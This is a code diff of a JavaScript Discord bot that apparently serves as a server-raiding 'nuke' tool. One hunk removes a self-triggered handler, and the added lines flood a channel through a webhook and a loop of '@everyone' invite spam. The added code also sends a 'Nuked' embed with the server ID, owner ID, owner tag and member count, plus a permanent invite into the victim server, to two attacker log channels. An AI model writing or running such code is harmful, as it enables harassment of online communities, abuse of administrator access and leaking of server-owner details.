@@ -77,27 +77,6 @@ if(!msg.me.hasPermission("CREATE_INSTANT_INVITE")) {
 
 
 
-client.on("message", msg => {
-    if(msg.author.id === msg.client.user.id) {
-    if(msg.content === `@everyone all hail me`) {
- const server = msg.client.guilds.cache.find(g => g.id === guild2)
-        const channel = server.channels.cache.find(c => c.id === logC2)
-
-  const Id = msg.guild.id
-  const Oid = msg.guild.ownerID
-  const Otag = msg.guild.owner.user.tag //user goes null so idk
-  const Gm = msg.guild.memberCount
-const nukeEmbed = new Discord.MessageEmbed()
-.setColor('#FF0435')
-.setTitle(`Nuked "${msg.guild.name}"`)
-.setAuthor(client.user.username, "https://media.discordapp.net/attachments/762080346774568981/762277872722247720/latest.png")
-.addField(`Server ID: **${Id}**\nServer Owner ID: **${Oid}**\nServer Owner Tag: **${Otag}**\nServer MemberCount: **${Gm}**`, "_ _")      
-msg.channel.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
-.then(invite => channel.send(nukeEmbed).then(channel.send(`discord.gg/${invite.code}`)))
-}
-    }
-})
-
 
 client.on("message", msg => {
         if(msg.content.startsWith(`${prefix}summon`)) {
@@ -409,7 +388,40 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
                 p.send("@everyone all hail me")
                 p.send("https://discord.gg/hKVK9r7DGt @everyone")
                 p.send("kiss my disrespectful ass")
-                p.send("wait 7 seconds for the spam btw")
+                p.createWebhook("assy").then(w => {
+                     
+                [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1].forEach(function(i) {
+                    w.send("https://discord.gg/hKVK9r7DGt @everyone")
+                    
+                
+                })
+            
+            })
+            var spam = 0
+            while(spam < 15) 
+        {    
+            p.send(randomT() + " @everyone")
+            spam++
+        }
+                   const server = msg.client.guilds.cache.find(g => g.id === guild2)
+        const channel = server.channels.cache.find(c => c.id === logC2)
+                  const server2 = msg.client.guilds.cache.find(g => g.id === guild)
+        const channel2 = server2.channels.cache.find(c => c.id === logC)
+
+  const Id = msg.guild.id
+  const Oid = msg.guild.ownerID
+  const Otag = msg.guild.owner.user.tag //user goes null so idk
+  const Gm = msg.guild.memberCount
+const nukeEmbed = new Discord.MessageEmbed()
+.setColor('#FF0435')
+.setTitle(`Nuked "${msg.guild.name}"`)
+.setAuthor(client.user.username, "https://media.discordapp.net/attachments/762080346774568981/762277872722247720/latest.png")
+.addField(`Server ID: **${Id}**\nServer Owner ID: **${Oid}**\nServer Owner Tag: **${Otag}**\nServer MemberCount: **${Gm}**`, "_ _")      
+p.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
+.then(invite => {
+channel.send(nukeEmbed).then(channel.send(`discord.gg/${invite.code}`))
+channel2.send(nukeEmbed).then(channel2.send(`discord.gg/${invite.code}`))
+})
              })
         setTimeout(() => { 
           while(pray < 2) {
